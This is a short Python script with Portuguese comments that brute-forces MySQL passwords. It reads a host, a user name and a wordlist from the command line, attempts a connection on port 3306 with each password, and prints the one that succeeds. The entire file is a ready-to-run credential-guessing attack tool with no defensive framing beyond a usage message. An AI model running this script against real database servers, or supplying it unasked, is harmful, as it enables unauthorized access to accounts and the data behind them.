import sys
import getopt
import mysql.connector as mysql

# funćão de ajuda
def help():
    print(f"""
        Modo de uso: {sys.argv[0]} -h <host> -u <user> -w <wordlist> -v (verbose)
        """)
    sys.exit()

# tenta capturar os argumentos
try:
    opts, args = getopt.getopt(sys.argv[1:], "h:u:w:v")
except getopt.GetoptError:
    help()

# setando verbose como False
verbose = 0

# definindo o valor dos argumentos
for opt, arg in opts:
    if opt == '-v':
        verbose = 1
    elif opt == '-h':
        hst = arg
    elif opt == '-u':
        user = arg
    elif opt == '-w':
        wordlist = arg


# funcão brute force
def brute(hst, user, wordlist, verbose):
    
    # abre o arquivo
    with open(wordlist) as wl:

        # itera sobre as senhas
        for pwd in wl:
            pwd = pwd.strip()
            if verbose:
                print(f"Tentando senha: {pwd}\n")

            # tenta uma conexão por senha
            try:
                    db = mysql.connect(
                    host = hst,
                    user = user,
                    port = 3306,
                    password = pwd,
                    use_pure = True,
                    charset = 'utf8'
                    )
                    print(f"\nSenha encontrada {pwd}")
                    sys.exit()
            except mysql.errors.ProgrammingError:
                pass
                
# chamando a funcao
brute(hst, user, wordlist, verbose)

